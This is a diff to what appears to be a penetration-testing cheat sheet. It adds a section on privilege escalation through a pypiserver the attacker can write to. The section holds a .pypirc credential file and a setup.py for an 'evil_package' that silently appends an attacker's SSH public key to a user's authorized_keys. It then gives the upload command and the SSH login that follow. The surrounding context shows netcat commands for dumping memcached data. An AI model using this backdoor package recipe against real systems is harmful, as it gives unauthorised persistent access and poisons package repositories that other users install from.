@@ -35,6 +35,7 @@ Table of Contents
    * [PrivEsc on Linux](#privesc-on-linux)
       * [From Docker group to root](#from-docker-group-to-root)
       * [Retrieving data from MemCache](#retrieving-data-from-memcache)
+      * [Uploading Malicious Packages to PyPi Server](#uploading-malicious-packages-to-pypi-server)
    * [Pivoting](#pivoting)
       * [Local Port Forward with Netsh](#local-port-forward-with-netsh)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
@@ -310,6 +311,66 @@ echo "stats items" | nc -n [IP] 11211
 echo "stats cachedump [NUMBER] 0" | nc -n [IP] 11211
 # If any object is being cached, we should see some items with their names. This is the moment to check for useful information, just doing:
 echo "get [ITEM_NAME]" | nc -vn [IP] 11211
+```
+
+# Uploading Malicious Packages to PyPi Server
+If we are looking for PrivEsc or Lateral Movement, and we got privileges enough to manage a [pypi server](https://pypi.org/project/pypiserver/), for example having found a valid credentials, we can perform this steps below to gain the privileges that the user running that server has:
+
+As per the [PyPi server documentation](https://pypi.org/project/pypiserver/#upload-with-setuptools), we must create two files:
+
+```bash
+# .pypirc
+[distutils]
+index-servers = 
+  local
+
+[local]
+repository: http://[PYPI_SERVER_URL:PORT]
+username: [USERNAME]
+password: [PASSWORD]
+```
+
+```bash
+# setup.py
+import setuptools
+
+try:
+    # Here we should place our payload, for instance, a good (and stealthy option is to add a previously generated public key into the SSH Authorized keys)
+    with open("/home/[USER]/.ssh/authorized_keys", "a") as f:
+        f.write("\n[ID_RSA.PUB_CONTENT]")
+        f.close()
+except Exception as e:
+    pass
+
+setuptools.setup(
+    name="evil_package",
+    version="0.0.1",
+    author="Example Author",
+    author_email="author@example.com",
+    description="A small example package",
+    long_description="",
+    long_description_content_type="text/markdown",
+    url="https://github.com/pypa/sampleproject",
+    packages=setuptools.find_packages(),
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ],
+)
+```
+
+After we have created these two files, we upload them to the targeted server, for example to "/tmp/" folder, and we have to execute these two commands:
+
+```bash
+HOME=/tmp/evil_package
+python3 /tmp/evil_package/setup.py sdist register -r local upload -r local
+```
+
+If the Output includes sentences like *"Submitting dist/evil_package-0.0.1.tar.gz to [URL]"* and *"Server response (200): OK"*, then we must be able to enter via SSH just doing: 
+
+```bash
+chmod 600 id_rsa && ssh -i id_rsa [USER]@[RHOST]
 ```
 
 # Pivoting
